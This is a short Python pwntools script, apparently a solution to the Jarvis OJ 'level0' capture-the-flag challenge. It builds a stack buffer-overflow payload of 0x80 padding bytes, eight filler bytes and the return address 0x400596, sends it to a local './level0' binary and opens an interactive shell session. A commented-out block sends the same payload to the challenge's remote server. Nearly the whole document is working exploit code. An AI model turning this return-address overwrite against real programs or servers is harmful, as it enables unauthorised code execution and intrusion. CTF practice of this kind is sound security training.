from pwn import * 
import pwn
import subprocess
 
number = 123456789
hex_string = p64(number)
print(hex_string)

data_to_send = b'a' * 0x80 + b'8' * 8  + p64(0x400596)
# 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x96\x05\x40\x00
# 打开本地程序并进行交互
sh = process("./level0")
sh.sendline(data_to_send)
sh.interactive()

# r = pwn.remote('pwn2.jarvisoj.com', 9881)
# payload = b'a'*0x80 + b'b'*8 + p64(0x400596)
# r.sendline(payload)
# r.interactive()